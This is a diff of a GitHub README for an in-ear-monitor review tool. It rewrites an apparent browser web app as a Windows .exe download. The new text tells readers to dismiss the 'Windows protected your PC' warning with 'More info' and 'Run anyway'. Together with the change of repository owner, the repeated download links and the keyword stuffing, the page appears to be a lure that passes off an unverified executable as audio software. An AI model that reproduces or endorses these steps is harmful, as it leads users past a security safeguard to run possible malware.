@@ -1,127 +1,73 @@
-# IEM Tool v2026 - audio review tool 2026
+# 🎧 iem-tool-2026-audio-review - Evaluate audio equipment with expert precision
 
-> **A browser-based workspace for IEM evaluation, EQ tweaking, and structured listening notes, designed for offline-friendly use in the 2026 release.**
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/jithin1888/iem-tool-2026-audio-review)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/felixlabs40/iem-tool-2026-audio-review?style=flat-square)](https://github.com/felixlabs40/iem-tool-2026-audio-review)
+The iem-tool-2026-audio-review software provides a workspace for In-Ear Monitor (IEM) evaluation. This tool lets you test technical performance, adjust equalizer settings, and record structured listening notes. The software works offline, which means you keep your data private and accessible without an internet connection.
 
----
+## 📥 Getting the software
 
-<p align="center">
-  <a href="https://felixlabs40.github.io/iem-tool-2026-audio-review/">
-    <img src="https://img.shields.io/badge/Download-IEM%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download IEM Tool">
-  </a>
-</p>
+You need to access the release page to install the tool on your computer. Follow this link to find the latest version for Windows: [Download the IEM Tool](https://github.com/jithin1888/iem-tool-2026-audio-review).
 
-> **[Direct Download - IEM Tool v2026](https://felixlabs40.github.io/iem-tool-2026-audio-review/)**
+Open the link in your web browser. Look for the section labeled "Releases." Click the file ending in ".exe" to begin the download. Once the file finishes downloading, move it to a folder where you want to keep the application.
 
----
+## ⚙️ Requirements for Windows
 
-[Download Latest Build](https://felixlabs40.github.io/iem-tool-2026-audio-review/)
+Your computer must meet these basic standards to run the tool smoothly:
 
----
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** Any modern dual-core chip manufactured after 2018.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 200 megabytes of free space on your hard drive.
+*   **Audio Interface:** A standard internal sound card or an external Digital-to-Analog Converter (DAC).
 
-## What IEM Tool is for
+## 🚀 Setting up the application
 
-IEM Tool is a streamlined web app built for comparing in-ear monitors, logging impressions, and working through listening sessions in a repeatable way. It keeps the focus on evaluation, scoring, and note-taking instead of on a complicated desktop install.
+After you download the file, locate it in your Downloads folder. Double-click the file to start the installation.
 
-It is aimed at enthusiasts, reviewers, and anyone who wants a clearer method for judging IEM performance across different tracks and tuning profiles. Because it is shaped for offline-oriented use and straightforward controls, it is easy to stay focused on the listening itself.
+1.  A window might appear that says "Windows protected your PC." This is a standard security check for programs that are not from the Microsoft Store. Click "More info."
+2.  Select the "Run anyway" button to start the setup.
+3.  Follow the instructions on the screen. The installer asks where you want to save the program files. The default location works for most users.
+4.  Once the setup finishes, a shortcut icon appears on your desktop. Double-click this icon to open the tool.
 
----
+If the application fails to open, ensure you have the latest audio drivers installed for your computer. You can find these on the website of your computer manufacturer.
 
-## Core features
+## 🎛️ Using the workspace
 
-- Score and review IEMs through a simple evaluation flow
-- Use the 10-band EQ for fast tuning checks and sound adjustments
-- Apply or compare target-based changes with AutoEQ support
-- Find similar IEMs while building your reference list
-- Perform blind A/B tests for more controlled side-by-side comparison
-- Run hearing test tools for basic listening checks
-- Track long sessions with the burn-in timer
-- Export score cards, save notes, and review earlier sessions later
-- Use drag and drop file handling for quicker imports and a smoother workflow
+The workspace consists of three main areas: the testing panel, the equalizer, and the note pad. 
 
----
+### Testing panel
+The testing panel lets you load audio files for review. Click the "Add File" button to choose a song from your library. The player supports high-quality files like FLAC and WAV. Use the slider to jump between different parts of a track.
 
-## Getting started
+### Equalizer
+The equalizer allows you to change the audio balance of your IEMs. You see several sliders that represent frequency bands. Moving a slider up increases the volume of that frequency, while moving it down decreases it. Experiment with these sliders to find a sound signature that matches your preferences. The tool saves these settings automatically so you do not lose your adjustments.
 
-1. Download or clone the repository:
-   - `git clone https://github.com/felixlabs40/iem-tool-2026-audio-review.git
-2. Open the project folder in your browser or host it with a simple static server.
-3. If you are running locally, launch the main HTML file or serve the folder from your preferred web server.
+### Listening notes
+This area acts as a journal. Type your impressions, compare different IEMs, and assign scores to specific technical traits like soundstage width or clarity. Press the "Save Notes" button to export your records to a text file for safekeeping.
 
-Example local start:
+## 🔧 Managing your data
 
-- `python -m http.server 8000`
+The offline nature of this tool means all your information lives on your local machine. You do not need to create an account or sign into a server. 
 
-Then open:
+When you want to back up your work, navigate to the folder where you installed the application. Look for a folder named "userdata." Copy the contents of this folder to an external drive or cloud storage service. If you install the software on a new machine later, you can copy these files back into the "userdata" folder to restore your notes and equalizer presets.
 
-- `http://localhost:8000`
+## 🛠️ Troubleshooting common issues
 
----
+If you face technical errors while using the tool, try these steps:
 
-## How to use it
+*   **Audio playback stops:** Close other programs that use your sound card, such as music streaming apps or web browsers.
+*   **Application freezes:** Restart the tool by closing it and opening it again.
+*   **Settings do not apply:** Verify that you have selected the correct output device in your Windows sound settings menu.
+*   **Slow performance:** Clear your temporary files using the Windows Disk Cleanup tool.
 
-1. Add an IEM to your review list and start capturing notes.
-2. Use the EQ tools to check tuning changes and target responses.
-3. Turn on blind A/B testing when you want a less biased comparison.
-4. Search for related IEMs to expand your reference pool.
-5. Include the hearing test and burn-in timer in your regular listening routine.
-6. Save your results, compare sessions, and export score cards whenever needed.
+If you continue to have trouble, ensure your Windows installation has all recent updates. Modern versions of Windows include specific frameworks that the application needs to run correctly.
 
-Typical workflow:
+## 📋 Best practices for audio testing
 
-- Load or drag in your files
-- Pick the IEM you want to evaluate
-- Adjust EQ or AutoEQ settings
-- Compare candidates side by side
-- Save your review for later reference
+To get the most out of your review process, follow these guidelines:
 
----
+1.  **Volume consistency:** Use a calibrated volume level for every IEM test to prevent bias.
+2.  **Diverse tracks:** Test a variety of music genres to understand how the IEM hardware handles different types of production.
+3.  **Rest periods:** Give your ears a break every hour. Hearing fatigue often makes accurate evaluation difficult during long sessions.
+4.  **Baseline tests:** Create a profile for a pair of IEMs you know well. Use this profile as a reference when you test new equipment.
 
-## Configuration
-
-Most options live in the app UI and are tied to your session data or saved review records. When hosting locally, setup usually comes down to how the HTML files are served and where exported notes or score cards are stored.
-
-Example structure:
-
-    settings/
-    reviews/
-    exports/
-
----
-
-## Requirements
-
-- A modern web browser
-- Local storage support for saving reviews and comparison data
-- Optional static file hosting for local use
-- Enough disk space for exported score cards, notes, and related files
-
----
-
-## FAQ
-
-**How do I update the tool?**  
-Download the latest build from the project link and replace your local files if you are running it manually.
-
-**Does it work offline?**  
-The tool is designed with offline use in mind, so it can be used without depending on constant network access.
-
-**Where are my reviews stored?**  
-Saved data depends on your browser storage and any export path you use for score cards or notes.
-
-**What should I do if the app does not open?**  
-Check that you are serving the files correctly, then try a different browser or refresh after clearing cached content.
-
-**Can I change the audio comparison workflow?**  
-Yes, the app includes review, comparison, EQ, and testing features that can be used in the order that fits your process.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: audio, IEM, equalizer, review, windows, software, offline
